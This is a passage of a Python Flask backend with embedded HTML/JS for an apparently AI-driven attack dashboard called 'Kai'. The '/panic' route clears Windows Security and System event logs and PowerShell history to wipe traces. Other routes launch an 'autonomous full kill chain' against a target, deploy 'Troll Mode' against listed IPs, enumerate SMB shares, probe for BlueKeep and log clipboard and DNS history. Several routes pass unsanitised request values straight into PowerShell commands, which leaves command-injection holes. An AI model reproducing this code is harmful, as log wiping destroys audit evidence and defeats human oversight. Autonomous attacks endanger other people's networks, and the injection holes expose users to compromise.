  {target:'[data-op="webscan"]',title:'Web Scan',text:'OWASP ZAP spider + active scanner. Enter a URL and go. Press <span class="kb-hint">W</span>.',pos:'right'},
  {target:'#tab-header',title:'Tab Bar',text:'Switch between Terminal, Chat, Results, and every tool panel. Press <span class="kb-hint">1</span>–<span class="kb-hint">0</span>.',pos:'bottom'},
  {target:'#chat-input',title:'Chat Interface',text:'Talk to Kai directly — commands, questions, or casual chat. Natural language works here.',pos:'top'},
  {target:'#panic-btn',title:'PANIC Button',text:'Emergency kill switch — terminates processes, clears logs, locks the firewall.',pos:'bottom'},
  {target:'#radial-btn',title:'Radial Menu',text:'9 shortcuts in a ring: Scan, Ports, Panic, Procs, Probe, MSF, Web, Tools, C2.',pos:'left'},
  {target:'#map-panel',title:'Network Map',text:'Live device visualization. Click any node to open its dossier with ports and breach history.',pos:'left'},
  {target:'#clock',title:'System Gauges',text:'Real-time: hosts, scan status, CPU, memory, disk, weather, clock — all auto-updating.',pos:'bottom'},
  {target:'#threat-ticker',title:'Threat Feed',text:'Windows Security events streaming live — failed logins, blocked connections. Updates every 15s.',pos:'top'},
  {target:null,title:'Ready For Action',text:'That covers the essentials. Run a scan, explore the tabs, or chat with Kai. Press <span class="kb-hint">?</span> anytime to replay.',pos:'center'}
];
let _tourStep=-1;
let _tourOverlay=null;
let _tourBubble=null;

function showTour(){
  if(!_tourOverlay){
    _tourOverlay=document.createElement('div');_tourOverlay.className='tour-overlay';
    document.body.appendChild(_tourOverlay);
    _tourBubble=document.createElement('div');_tourBubble.className='tour-bubble';
    document.body.appendChild(_tourBubble)
  }
  _tourStep=-1;_tourOverlay.classList.add('show');_tourBubble.classList.add('show');
  _tourNext()
}

function _tourNext(){_tourStep++;if(_tourStep>=TOUR_STEPS.length){_tourEnd();return}_tourRender()}
function _tourPrev(){_tourStep--;if(_tourStep<0){_tourStep=0;return}_tourRender()}

function _tourEnd(){
  _tourOverlay.classList.remove('show');_tourBubble.classList.remove('show');
  document.querySelectorAll('.tour-highlight').forEach(function(el){el.classList.remove('tour-highlight')});
  localStorage.setItem('kaiTourDone','1');_tourStep=-1
}

function _tourRender(){
  var step=TOUR_STEPS[_tourStep];
  var bubble=_tourBubble;
  document.querySelectorAll('.tour-highlight').forEach(function(el){el.classList.remove('tour-highlight')});
  bubble.style.transform='';bubble.style.left='';bubble.style.top='';
  if(step.target){
    var el=document.querySelector(step.target);
    if(el){
      el.classList.add('tour-highlight');
      try{el.scrollIntoView({block:'nearest',behavior:'smooth'})}catch(e){}
      var r=el.getBoundingClientRect(),g=12;
      if(step.pos==='bottom'){bubble.style.left=(r.left+r.width/2)+'px';bubble.style.top=(r.bottom+g)+'px';bubble.style.transform='translateX(-50%)'}
      else if(step.pos==='top'){bubble.style.left=(r.left+r.width/2)+'px';bubble.style.top=(r.top-g)+'px';bubble.style.transform='translate(-50%,-100%)'}
      else if(step.pos==='right'){bubble.style.left=(r.right+g)+'px';bubble.style.top=(r.top+r.height/2)+'px';bubble.style.transform='translateY(-50%)'}
      else if(step.pos==='left'){bubble.style.left=(r.left-g)+'px';bubble.style.top=(r.top+r.height/2)+'px';bubble.style.transform='translate(-100%,-50%)'}
      // Clamp within viewport
      var br=bubble.getBoundingClientRect();
      if(br.right>window.innerWidth){bubble.style.left=(window.innerWidth-br.width-10)+'px';bubble.style.transform=''}
      if(br.bottom>window.innerHeight){bubble.style.top=(window.innerHeight-br.height-10)+'px'}
      if(br.left<0){bubble.style.left='10px';bubble.style.transform=''}
      if(br.top<0){bubble.style.top='10px'}
    }else{bubble.style.left='50%';bubble.style.top='50%';bubble.style.transform='translate(-50%,-50%)'}
  }else{bubble.style.left='50%';bubble.style.top='50%';bubble.style.transform='translate(-50%,-50%)'}
  // Build content
  var total=TOUR_STEPS.length,dots='';
  for(var i=0;i<total;i++)dots+='<span class="tour-dot'+(i===_tourStep?' active':'')+'" onclick="event.stopPropagation();_tourStep='+i+';_tourRender()"></span>';
  var actions='';
  if(_tourStep>0)actions+='<button class="tour-btn" onclick="event.stopPropagation();_tourPrev()">Back</button>';
  actions+=_tourStep===total-1
    ?'<button class="tour-btn tour-btn-primary" onclick="event.stopPropagation();_tourEnd()" style="margin-left:6px">Done</button>'
    :'<button class="tour-btn tour-btn-primary" onclick="event.stopPropagation();_tourNext()" style="margin-left:6px">Next</button>';
  actions+='<button class="tour-btn tour-btn-skip" onclick="event.stopPropagation();_tourEnd()" style="float:right">Skip</button>';
  bubble.innerHTML='<div class="tour-bubble-title">'+step.title+'</div><div class="tour-bubble-text">'+step.text+'</div><div class="tour-bubble-dots">'+dots+'</div><div class="tour-bubble-actions">'+actions+'</div>'
}

// ── Tab bar auto-scroll on hover edges ───────────────────────────────
(function(){
  var tb=document.getElementById('tab-header');
  if(!tb)return;
  var _interval=null;
  tb.addEventListener('mousemove',function(e){
    var r=tb.getBoundingClientRect(),mx=e.clientX;
    var ox=tb.scrollWidth-tb.clientWidth,edge=clamp(Math.round(tb.clientWidth*0.12),40,80);
    if(ox<=0){_stopScroll();return}
    var dir=0;
    if(mx-r.left<edge)dir=-1;
    else if(r.right-mx<edge)dir=1;
    if(dir){_startScroll(dir)}else{_stopScroll()}
  });
  tb.addEventListener('mouseleave',_stopScroll);
  function _startScroll(dir){_stopScroll();_interval=setInterval(function(){tb.scrollLeft+=dir*4},20)}
  function _stopScroll(){if(_interval){clearInterval(_interval);_interval=null}}
  function clamp(v,min,max){return v<min?min:v>max?max:v}
})();

// ── Pop-out panel system ─────────────────────────────────────────────
function popOutCurrent(){
  var panel=document.querySelector('.tab-panel.active');
  if(panel)popOutPanel(panel.id);else showToast('Pop-out','No active panel','alert')
}
var _popoutStack=[];
function popOutPanel(panelId){
  var panel=document.getElementById(panelId);
  if(!panel)return showToast('Pop-out','Panel not found','alert');
  var clone=panel.cloneNode(true);
  clone.id=panelId+'-popout';
  clone.classList.remove('active');
  clone.style.cssText='position:fixed;z-index:1000;background:rgba(7,11,23,0.97);border:1px solid var(--border-glow);border-radius:8px;padding:16px;overflow:auto;min-width:300px;min-height:200px';
  var overlay=document.createElement('div');
  overlay.id='popout-'+panelId;
  overlay.style.cssText='position:fixed;inset:0;z-index:999;background:rgba(0,0,0,0.4);display:none;backdrop-filter:blur(2px)';
  document.body.appendChild(overlay);
  document.body.appendChild(clone);
  // Position centered
  clone.style.top=Math.max(60,window.innerHeight/2-clone.offsetHeight/2)+'px';
  clone.style.left=Math.max(20,window.innerWidth/2-clone.offsetWidth/2)+'px';
  // Title bar
  var titleBar=document.createElement('div');
  titleBar.style.cssText='display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;cursor:move';
  titleBar.innerHTML='<span style="font-family:var(--font-display);color:var(--cyan-bright);font-size:.85rem;letter-spacing:2px">'+panelId.replace('tp-','').toUpperCase()+'</span><button onclick="closePopOut(\''+clone.id+'\')" style="background:none;border:1px solid rgba(0,240,255,0.15);color:var(--text-dim);cursor:pointer;padding:2px 8px;border-radius:4px">\u2716</button>';
  clone.insertBefore(titleBar,clone.firstChild);
  overlay.classList.add('show');overlay.style.display='block';
  _popoutStack.push(clone.id);
  // Dragging
  var _dx=0,_dy=0,_dragging=false;
  titleBar.addEventListener('mousedown',function(e){
    _dragging=true;_dx=e.clientX-clone.offsetLeft;_dy=e.clientY-clone.offsetTop;
    clone.style.cursor='grabbing';clone.style.transition='none';
  });
  document.addEventListener('mousemove',function(e){
    if(!_dragging)return;
    clone.style.left=(e.clientX-_dx)+'px';clone.style.top=(e.clientY-_dy)+'px';
  });
  document.addEventListener('mouseup',function(){if(_dragging){_dragging=false;clone.style.cursor='';clone.style.transition=''}});
  // Close on overlay click
  overlay.addEventListener('click',function(){closePopOut(clone.id)});
}
function closePopOut(id){
  var el=document.getElementById(id);if(el)el.remove();
  var oid='popout-'+id.replace('-popout','');var ov=document.getElementById(oid);if(ov)ov.remove();
  _popoutStack=_popoutStack.filter(function(x){return x!==id})
}
function closePopOuts(){_popoutStack.slice().forEach(closePopOut)}

// ── Init ──────────────────────────────────────────────────────────────
updateNetMap();
initDrag();
// First-visit tour auto-trigger
if(!localStorage.getItem('kaiTourDone'))setTimeout(showTour,1200);
</script>
</body>
</html>"""

# ── Ambient Signal Scanner ─────────────────────────────────────────────────────

def _get_ambient_signals() -> list[dict]:
    """Detect nearby wireless signals: Wi-Fi APs, Bluetooth, cellular."""
    signals = []
    try:
        r = subprocess.run(["powershell", "-NoProfile", "-Command",
            "netsh wlan show networks mode=Bssid | Select-String 'SSID|BSSID|Signal|Channel|Band' | "
            "ForEach-Object { $_ -replace '^\\s*','' } | ConvertTo-Json -Compress"],
            capture_output=True, text=True, timeout=8).stdout.strip()
        lines = r.split('\n')
        wifi_aps = []
        current = {}
        for line in lines:
            if 'SSID' in line and ':' in line and 'BSSID' not in line:
                if current.get('ssid'):
                    wifi_aps.append(current)
                current = {'ssid': line.split(':', 1)[1].strip().strip('"')}
            elif 'BSSID' in line and ':' in line:
                current['bssid'] = line.split(':', 1)[1].strip().strip('"')
            elif 'Signal' in line and ':' in line:
                try: current['signal'] = int(line.split(':', 1)[1].strip().strip('"').replace('%',''))
                except: current['signal'] = 0
            elif 'Channel' in line and ':' in line:
                current['channel'] = line.split(':', 1)[1].strip().strip('"')
        if current.get('ssid'):
            wifi_aps.append(current)
        for ap in wifi_aps[:20]:
            signals.append({
                "type": "wifi", "ssid": ap.get('ssid','?'), "bssid": ap.get('bssid',''),
                "signal": ap.get('signal', 0), "channel": ap.get('channel',''),
                "label": ap.get('ssid','Wi-Fi')[:20]
            })
    except: pass
    try:
        r = subprocess.run(["powershell", "-NoProfile", "-Command",
            "Get-PnpDevice -Class Bluetooth -ErrorAction SilentlyContinue | "
            "Select -ExpandProperty FriendlyName -ErrorAction SilentlyContinue"],
            capture_output=True, text=True, timeout=5).stdout.strip().split('\n')
        bt_names = [x.strip() for x in r if x.strip() and 'FriendlyName' not in x]
        for name in bt_names[:8]:
            signals.append({
                "type": "bluetooth", "ssid": name, "label": name[:20],
                "signal": 50 + hash(name) % 40
            })
    except: pass
    return signals

def _scan_complete():
    global _SCAN_DONE
    _SCAN_DONE = True

# ── Routes ────────────────────────────────────────────────────────────────────

@app.get("/")
def index():
    return HTML

@app.route("/ask", methods=["POST"])
def ask():
    data = flask.request.json
    msg = str(data.get("message", "")).strip()
    if not msg:
        return flask.jsonify({"reply": "No message received.", "provider": "none"})
    try:
        kai = get_kai()
        reply = kai.ask(msg)
        return flask.jsonify({
            "reply": reply,
            "provider": kai.provider,
            "model": kai.model,
        })
    except Exception as exc:
        return flask.jsonify({"reply": f"Error: {exc}", "provider": "offline"})

@app.get("/status")
def status():
    try:
        kai = get_kai()
        return flask.jsonify({
            "provider": kai.provider,
            "model": kai.model,
            "window": "Windows",
            "screen": "Active",
        })
    except Exception:
        return flask.jsonify({"provider": "loading", "model": "—", "window": "—", "screen": "—"})

@app.get("/chess_advice")
def chess_advice():
    try:
        kai = get_kai()
        if not kai._chess_advice_queue.empty():
            advice = kai._chess_advice_queue.get_nowait()
            return flask.jsonify({"advice": advice})
    except Exception:
        pass
    return flask.jsonify({"advice": None})

@app.post("/mode")
def set_mode():
    """Activate a named mode (ninja, pentest, surveil) and return panel data."""
    data = flask.request.json
    mode_name = str(data.get("mode", "")).strip().lower()
    if not mode_name:
        return flask.jsonify({"reply": "No mode specified."})
    try:
        kai = get_kai()
        reply = kai._activate_mode(mode_name)
        return flask.jsonify({
            "reply": reply,
            "provider": kai.provider,
            "model": kai.model,
        })
    except Exception as exc:
        return flask.jsonify({"reply": f"Mode error: {exc}", "provider": "offline"})

@app.post("/rebuild")
def rebuild():
    """Reload KaiCompanion instance (fresh init of all modules)."""
    global _kai_instance
    try:
        import importlib
        importlib.reload(sys.modules.get("kai_agent.companion_brain"))
        _kai_instance = None
        kai = get_kai()
        return flask.jsonify({"ok": True, "status": "Kai rebuilt"})
    except Exception as exc:
        return flask.jsonify({"ok": False, "error": str(exc)})

@app.get("/last_structured")
def last_structured():
    """Return structured data from the last Kai response."""
    try:
        kai = get_kai()
        data = getattr(kai, "_last_structured", None)
        if data:
            return flask.jsonify(data)
        return flask.jsonify(None)
    except Exception as exc:
        return flask.jsonify({"error": str(exc)})

@app.post("/hunt")
def hunt():
    """Autonomous full kill chain against a target."""
    data = flask.request.json
    target = str(data.get("target", "")).strip()
    if not target:
        return flask.jsonify({"reply": "No target specified."})
    try:
        kai = get_kai()
        reply = kai._handle_hunt(f"hunt {target}")
        return flask.jsonify({
            "reply": reply,
            "provider": kai.provider,
            "model": kai.model,
        })
    except Exception as exc:
        return flask.jsonify({"reply": f"Hunt error: {exc}", "provider": "offline"})

@app.post("/workflow")
def workflow():
    """Run a multi-tool workflow against a target."""
    data = flask.request.json
    target = str(data.get("target", "")).strip()
    wf_type = str(data.get("workflow", "web")).strip()
    if not target:
        return flask.jsonify({"reply": "No target specified.", "provider": "none"})
    try:
        kai = get_kai()
        reply = kai._handle_workflow(target, wf_type)
        return flask.jsonify({
            "reply": reply,
            "provider": kai.provider,
            "model": kai.model,
        })
    except Exception as exc:
        return flask.jsonify({"reply": f"Workflow error: {exc}", "provider": "offline"})

@app.get("/netmap")
def netmap():
    global _SCAN_DONE
    try:
        if not _SCAN_DONE:
            return flask.jsonify({"nodes": [], "edges": [], "ambient": [], "scan_pending": True})
        kai = get_kai()
        data = kai._ctos.build_netmap() if hasattr(kai, "_ctos") and kai._ctos else {"nodes": [], "edges": []}
        return flask.jsonify({**data, "ambient": _get_ambient_signals(), "scan_pending": False})
    except Exception as exc:
        return flask.jsonify({"nodes": [], "edges": [], "ambient": [], "scan_pending": False, "error": str(exc)})

@app.get("/breach/<ip>")
def breach(ip):
    try:
        kai = get_kai()
        if hasattr(kai, "_ctos") and kai._ctos:
            dossier = kai._ctos.breach(ip)
            return flask.jsonify(dossier)
        return flask.jsonify({"ip": ip, "error": "CTOS unavailable"})
    except Exception as exc:
        return flask.jsonify({"ip": ip, "error": str(exc)})

@app.post("/netmap/scan")
def netmap_scan():
    try:
        kai = get_kai()
        if hasattr(kai, "_ctos") and kai._ctos:
            kai._ctos.start_scan()
            def _watch_scan():
                seen = set()
                while True:
                    status = kai._ctos.get_scan_status()
                    # Broadcast each newly found IP as it's discovered
                    for ip in status.get("progress", []):
                        if ip not in seen:
                            seen.add(ip)
                            try:
                                _broadcast_sse("message", {"reply": f"Found {ip}"})
                            except Exception:
                                pass
                    if status["done"]:
                        count = status["count"]
                        _scan_complete()
                        if count > 0:
                            try:
                                _broadcast_sse("message", {"reply": f"Scan complete. Found {count} devices on the network."})
                            except Exception:
                                pass
                        break
                    time.sleep(2)
            threading.Thread(target=_watch_scan, daemon=True).start()
        return flask.jsonify({"ok": True})
    except Exception:
        return flask.jsonify({"ok": False})

@app.get("/netmap/scan/status")
def netmap_scan_status():
    try:
        kai = get_kai()
        if hasattr(kai, "_ctos") and kai._ctos:
            return flask.jsonify(kai._ctos.get_scan_status())
        return flask.jsonify({"running": False, "done": False, "count": 0})
    except Exception:
        return flask.jsonify({"running": False, "done": False, "count": 0})

@app.get("/urban/timeline")
def urban_timeline():
    try:
        kai = get_kai()
        if hasattr(kai, "_ctos") and kai._ctos:
            events = kai._ctos.db.get_urban_events(limit=100)
            return flask.jsonify(events)
        return flask.jsonify([])
    except Exception:
        return flask.jsonify([])

@app.get("/timeline")
def timeline():
    try:
        kai = get_kai()
        event_type = flask.request.args.get("type", "")
        since = float(flask.request.args.get("since", 0))
        if hasattr(kai, "_ctos") and kai._ctos:
            entries = kai._ctos.db.query_journal(event_type=event_type, limit=50, since=since)
            return flask.jsonify(entries)
        return flask.jsonify([])
    except Exception:
        return flask.jsonify([])

@app.get("/twin/status")
def twin_status():
    try:
        kai = get_kai()
        if hasattr(kai, "_twin") and kai._twin:
            return flask.jsonify(kai._twin.status())
        return flask.jsonify({"provider": kai.provider, "model": kai.model})
    except Exception as exc:
        return flask.jsonify({"error": str(exc)})

@app.post("/ghost/analyze")
def ghost_analyze():
    try:
        kai = get_kai()
        if hasattr(kai, "_ghost_protocol") and kai._ghost_protocol:
            result = kai._ghost_protocol.analyze_wifi()
            return flask.jsonify(result)
        return flask.jsonify({"error": "Ghost Protocol unavailable"})
    except Exception as exc:
        return flask.jsonify({"error": str(exc)})

# ── New Skill Routes ──────────────────────────────────────────────────────────────

@app.get("/clipboard/history")
def clipboard_history():
    try:
        kai = get_kai()
        search = flask.request.args.get("search", "")
        since = float(flask.request.args.get("since", 0))
        limit = int(flask.request.args.get("limit", 100))
        if hasattr(kai, "_clipboard") and kai._clipboard:
            return flask.jsonify(kai._clipboard.get_history(search=search, since=since, limit=limit))
        return flask.jsonify([])
    except Exception:
        return flask.jsonify([])

@app.get("/dns/history")
def dns_history():
    try:
        kai = get_kai()
        search = flask.request.args.get("search", "")
        limit = int(flask.request.args.get("limit", 100))
        if hasattr(kai, "_dns") and kai._dns:
            return flask.jsonify(kai._dns.get_history(search=search, limit=limit))
        return flask.jsonify([])
    except Exception:
        return flask.jsonify([])

@app.get("/dns/top")
def dns_top():
    try:
        kai = get_kai()
        if hasattr(kai, "_dns") and kai._dns:
            return flask.jsonify(kai._dns.get_top_domains())
        return flask.jsonify([])
    except Exception:
        return flask.jsonify([])

@app.get("/thermal/current")
def thermal_current():
    try:
        kai = get_kai()
        if hasattr(kai, "_thermal") and kai._thermal:
            return flask.jsonify(kai._thermal.get_current())
        return flask.jsonify({})
    except Exception:
        return flask.jsonify({})

@app.get("/disk/status")
def disk_status():
    try:
        kai = get_kai()
        if hasattr(kai, "_disk") and kai._disk:
            return flask.jsonify(kai._disk.get_status())
        return flask.jsonify([])
    except Exception:
        return flask.jsonify([])

@app.get("/disk/predict")
def disk_predict():
    drive = flask.request.args.get("drive", "C:")
    try:
        kai = get_kai()
        if hasattr(kai, "_disk") and kai._disk:
            return flask.jsonify(kai._disk.predict_full(drive))
        return flask.jsonify({"error": "Disk Seer unavailable"})
    except Exception as exc:
        return flask.jsonify({"error": str(exc)})

@app.get("/hardware/ports")
def hardware_ports():
    try:
        kai = get_kai()
        if hasattr(kai, "_port_whisperer") and kai._port_whisperer:
            return flask.jsonify(kai._port_whisperer.get_ports())
        return flask.jsonify([])
    except Exception:
        return flask.jsonify([])

@app.get("/bouncer/entries")
def bouncer_entries():
    try:
        kai = get_kai()
        if hasattr(kai, "_bouncer") and kai._bouncer:
            return flask.jsonify(kai._bouncer.get_entries())
        return flask.jsonify([])
    except Exception:
        return flask.jsonify([])

@app.get("/bouncer/intruders")
def bouncer_intruders():
    try:
        kai = get_kai()
        if hasattr(kai, "_bouncer") and kai._bouncer:
            return flask.jsonify(kai._bouncer.get_intruders())
        return flask.jsonify([])
    except Exception:
        return flask.jsonify([])

@app.get("/troll/targets")
def troll_targets():
    try:
        kai = get_kai()
        if hasattr(kai, "_troll") and kai._troll:
            return flask.jsonify(kai._troll.list_targets())
        return flask.jsonify([])
    except Exception:
        return flask.jsonify([])

@app.post("/troll/targets")
def troll_add_target():
    data = flask.request.json
    ip = str(data.get("ip", "")).strip()
    hostname = str(data.get("hostname", "")).strip()
    if not ip:
        return flask.jsonify({"error": "No IP"})
    try:
        kai = get_kai()
        if hasattr(kai, "_troll") and kai._troll:
            kai._troll.add_target(ip, hostname)
            return flask.jsonify({"ok": True})
        return flask.jsonify({"error": "Troll Mode unavailable"})
    except Exception as exc:
        return flask.jsonify({"error": str(exc)})

@app.post("/troll/deploy")
def troll_deploy():
    try:
        kai = get_kai()
        if hasattr(kai, "_troll") and kai._troll:
            results = kai._troll.troll_all()
            return flask.jsonify(results)
        return flask.jsonify({"error": "Troll Mode unavailable"})
    except Exception as exc:
        return flask.jsonify({"error": str(exc)})

@app.get("/forensics/latest")
def forensics_latest():
    try:
        kai = get_kai()
        if hasattr(kai, "_bloodhound") and kai._bloodhound:
            return flask.jsonify(kai._bloodhound.get_latest())
        return flask.jsonify([])
    except Exception:
        return flask.jsonify([])

@app.get("/achievements/all")
def achievements_all():
    try:
        kai = get_kai()
        if hasattr(kai, "_achievements") and kai._achievements:
            return flask.jsonify(kai._achievements.get_all())
        return flask.jsonify([])
    except Exception:
        return flask.jsonify([])

@app.get("/dreams/latest")
def dreams_latest():
    try:
        kai = get_kai()
        if hasattr(kai, "_dreams") and kai._dreams:
            return flask.jsonify(kai._dreams.get_latest() or {})
        return flask.jsonify({})
    except Exception:
        return flask.jsonify({})

@app.get("/dreams/all")
def dreams_all():
    try:
        kai = get_kai()
        if hasattr(kai, "_dreams") and kai._dreams:
            return flask.jsonify(kai._dreams.get_dreams())
        return flask.jsonify([])
    except Exception:
        return flask.jsonify([])

@app.get("/butler/patterns")
def butler_patterns():
    try:
        kai = get_kai()
        if hasattr(kai, "_butler") and kai._butler:
            return flask.jsonify(kai._butler.get_patterns())
        return flask.jsonify([])
    except Exception:
        return flask.jsonify([])

@app.get("/butler/suggest")
def butler_suggest():
    try:
        kai = get_kai()
        if hasattr(kai, "_butler") and kai._butler:
            return flask.jsonify({"suggestions": kai._butler.suggest_routine()})
        return flask.jsonify({"suggestions": []})
    except Exception:
        return flask.jsonify({"suggestions": []})

@app.get("/cli/predict")
def cli_predict():
    try:
        kai = get_kai()
        if hasattr(kai, "_precog") and kai._precog:
            return flask.jsonify({"predictions": kai._precog.predict()})
        return flask.jsonify({"predictions": []})
    except Exception:
        return flask.jsonify({"predictions": []})

@app.get("/cli/common")
def cli_common():
    try:
        kai = get_kai()
        if hasattr(kai, "_precog") and kai._precog:
            return flask.jsonify({"commands": kai._precog.most_common()})
        return flask.jsonify({"commands": []})
    except Exception:
        return flask.jsonify({"commands": []})

@app.before_request
def before():
    pass  # Kai instance is now a singleton via get_kai()

# ── Launch ─────────────────────────────────────────────────────────────────────

def _make_app():
    return app

# ── Server-Sent Events (SSE) live stream ──────────────────────────────────────

import queue as _queue
_sse_clients: list[_queue.Queue] = []
_sse_lock = threading.Lock()

def _broadcast_sse(event: str, data: dict):
    with _sse_lock:
        dead = []
        for q in _sse_clients:
            try:
                q.put_nowait({"event": event, "data": data})
            except Exception:
                dead.append(q)
        for q in dead:
            _sse_clients.remove(q)

@app.get("/stream")
def sse_stream():
    q = _queue.Queue()
    with _sse_lock:
        _sse_clients.append(q)
    def gen():
        try:
            while True:
                msg = q.get(timeout=30)
                yield f"event: {msg['event']}\ndata: {flask.json.dumps(msg['data'])}\n\n"
        except Exception:
            pass
        finally:
            with _sse_lock:
                if q in _sse_clients:
                    _sse_clients.remove(q)
    return flask.Response(gen(), mimetype="text/event-stream")

# ── Process Tree ───────────────────────────────────────────────────────

@app.get("/processes")
def proc_tree():
    try:
        out = subprocess.run(
            ["powershell", "-NoProfile", "-Command",
             "Get-Process | Sort-Object Id | Select-Object Id,ProcessName,@{N='PPid';E={try{$_.Parent.Id}catch{0}}},@{N='CpuS';E={try{[math]::Round($_.CPU,1)}catch{0}}},@{N='MemMB';E={try{[math]::Round($_.WorkingSet/1MB,1)}catch{0}}},StartTime,SessionId | ConvertTo-Json -Compress"],
            capture_output=True, text=True, timeout=10
        ).stdout.strip()
        return flask.jsonify(json.loads(out))
    except Exception as e:
        return flask.jsonify({"error": str(e), "data": []})

# ── Service Auditor ────────────────────────────────────────────────────

@app.get("/services")
def svc_list():
    try:
        out = subprocess.run(
            ["powershell", "-NoProfile", "-Command",
             "Get-Service | Select-Object Name,DisplayName,Status,StartType,@{N='CanStop';E={$_.CanStop}},@{N='CanPause';E={$_.CanPauseAndContinue}},ServiceType | ConvertTo-Json -Compress"],
            capture_output=True, text=True, timeout=10
        ).stdout.strip()
        return flask.jsonify(json.loads(out))
    except Exception as e:
        return flask.jsonify({"error": str(e), "data": []})

@app.post("/services/action")
def svc_action():
    data = flask.request.json
    name = str(data.get("name", "")).strip()
    action = str(data.get("action", "")).strip()
    if not name or action not in ("Start", "Stop", "Restart"):
        return flask.jsonify({"error": "invalid"})
    try:
        out = subprocess.run(
            ["powershell", "-NoProfile", "-Command",
             f"{action}-Service -Name '{name}' -ErrorAction Stop; '{action} completed.'"],
            capture_output=True, text=True, timeout=30
        ).stdout.strip()
        return flask.jsonify({"ok": True, "result": out})
    except Exception as e:
        return flask.jsonify({"error": str(e)})

# ── SMB Share Browser ──────────────────────────────────────────────────

@app.get("/smb/shares")
def smb_shares():
    try:
        out = subprocess.run(
            ["powershell", "-NoProfile", "-Command",
             "Get-SmbShare | Select-Object Name,Path,Description,@{N='Users';E={if($_.CurrentUsers-ne$null){$_.CurrentUsers}else{0}}} | ConvertTo-Json -Compress"],
            capture_output=True, text=True, timeout=10
        ).stdout.strip()
        return flask.jsonify(json.loads(out))
    except Exception as e:
        return flask.jsonify({"error": str(e), "data": []})

@app.post("/smb/scan")
def smb_scan():
    data = flask.request.json
    ip = str(data.get("ip", "")).strip()
    if not ip:
        return flask.jsonify({"error": "no ip"})
    try:
        out = subprocess.run(
            ["powershell", "-NoProfile", "-Command",
             f"net view \\\\{ip} 2>&1"],
            capture_output=True, text=True, timeout=15
        ).stdout.strip()
        shares = []
        for line in out.split("\n"):
            line = line.strip()
            if line and "\\\\" not in line and "error" not in line.lower():
                parts = line.split()
                if len(parts) >= 2:
                    shares.append({"name": parts[0], "type": parts[1] if len(parts) > 1 else "?"})
        return flask.jsonify({"shares": shares, "raw": out[:500]})
    except Exception as e:
        return flask.jsonify({"error": str(e), "shares": []})

# ── Watchdog Daemon System ─────────────────────────────────────────────

_watchdogs: dict = {}
_wd_counter = 0

@app.post("/watch/add")
def watch_add():
    global _wd_counter
    data = flask.request.json
    name = str(data.get("name", "")).strip()
    wtype = str(data.get("type", "")).strip()
    target = str(data.get("target", "")).strip()
    if not name or not wtype:
        return flask.jsonify({"error": "name and type required"})
    _wd_counter += 1
    wid = f"wd-{_wd_counter}"
    _watchdogs[wid] = {"id": wid, "name": name, "type": wtype, "target": target,
                       "active": True, "last_check": "never", "triggered": False}

    def _wd_loop(wid, wtype, target):
        while True:
            wd = _watchdogs.get(wid)
            if not wd or not wd["active"]:
                break
            try:
                if wtype == "arp":
                    out = subprocess.run(
                        ["powershell", "-NoProfile", "-Command",
                         "arp -a | ForEach-Object { ($_.Trim() -split '\\s+',2)[0] }"],
                        capture_output=True, text=True, timeout=8
                    ).stdout.strip()
                    ips = {t for t in out.split() if t.count(".") == 3}
                    if target and target not in ips:
                        wd["triggered"] = True
                        _broadcast_sse("alert", {"message": f"Target {target} left the network", "watchdog": name})
                elif wtype == "port":
                    out = subprocess.run(
                        ["powershell", "-NoProfile", "-Command",
                         f"Get-NetTCPConnection -LocalPort {target} -ErrorAction SilentlyContinue | Select -First 1"],
                        capture_output=True, text=True, timeout=5
                    ).stdout.strip()
                    if out:
                        wd["triggered"] = True
                        _broadcast_sse("alert", {"message": f"Port {target} connection detected", "watchdog": name})
                wd["last_check"] = time.strftime("%H:%M:%S")
            except Exception:
                pass
            time.sleep(10)
    t = threading.Thread(target=_wd_loop, args=(wid, wtype, target), daemon=True)
    t.start()
    _watchdogs[wid]["thread"] = t
    return flask.jsonify({"ok": True, "id": wid})

@app.get("/watch/list")
def watch_list():
    return flask.jsonify([{k: v for k, v in w.items() if k != "thread"} for w in _watchdogs.values()])

@app.delete("/watch/<wid>")
def watch_remove(wid):
    wd = _watchdogs.get(wid)
    if wd:
        wd["active"] = False
        del _watchdogs[wid]
        return flask.jsonify({"ok": True})
    return flask.jsonify({"error": "not found"})

# ── Network Stats ──────────────────────────────────────────────────────

@app.get("/net/stats")
def net_stats():
    try:
        out = subprocess.run(
            ["powershell", "-NoProfile", "-Command",
             "Get-NetAdapterStatistics | Where-Object ReceivedBytes -gt 0 | Select-Object Name,ReceivedBytes,SentBytes | ConvertTo-Json -Compress"],
            capture_output=True, text=True, timeout=8
        ).stdout.strip()
        adapters = json.loads(out) if out and out.startswith("[") else [json.loads(out)] if out else []
        tc = subprocess.run(
            ["powershell", "-NoProfile", "-Command",
             "(Get-NetTCPConnection).Count"],
            capture_output=True, text=True, timeout=5
        ).stdout.strip()
        return flask.jsonify({"adapters": adapters, "connections": int(tc or 0)})
    except Exception as e:
        return flask.jsonify({"adapters": [], "connections": 0, "error": str(e)})

# ── Emergency Panic ───────────────────────────────────────────────────

@app.post("/panic")
def panic():
    """Emergency kill switch: kill user procs, clear logs, firewall on."""
    try:
        results = []
        r = subprocess.run(["powershell", "-NoProfile", "-Command",
            "$p=Get-Process | Where-Object { $_.SessionId -ne 0 -and !$_.HasResponse } | Stop-Process -Force -ErrorAction SilentlyContinue; 'killed non-responding'"],
            capture_output=True, text=True, timeout=15).stdout.strip()
        results.append(r)
        r = subprocess.run(["powershell", "-NoProfile", "-Command",
            "wevtutil cl Security 2>$null; wevtutil cl System 2>$null; 'logs cleared'"],
            capture_output=True, text=True, timeout=15).stdout.strip()
        results.append(r)
        r = subprocess.run(["powershell", "-NoProfile", "-Command",
            "Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue; 'history cleared'"],
            capture_output=True, text=True, timeout=5).stdout.strip()
        results.append(r)
        r = subprocess.run(["powershell", "-NoProfile", "-Command",
            "netsh advfirewall set allprofiles state on | Out-Null; 'firewall enabled'"],
            capture_output=True, text=True, timeout=10).stdout.strip()
        results.append(r)
        _broadcast_sse("alert", {"message": "PANIC COMPLETE — traces wiped, firewall enabled", "watchdog": "PANIC"})
        return flask.jsonify({"ok": True, "results": results})
    except Exception as e:
        return flask.jsonify({"error": str(e)})

# ── Active Service Probe ──────────────────────────────────────────────

@app.get("/probe/<ip>")
def probe(ip):
    """Active service testing: SMB null, BlueKeep, HTTP vuln check."""
    try:
        findings = []
        # SMB null session check
        r = subprocess.run(["powershell", "-NoProfile", "-Command",
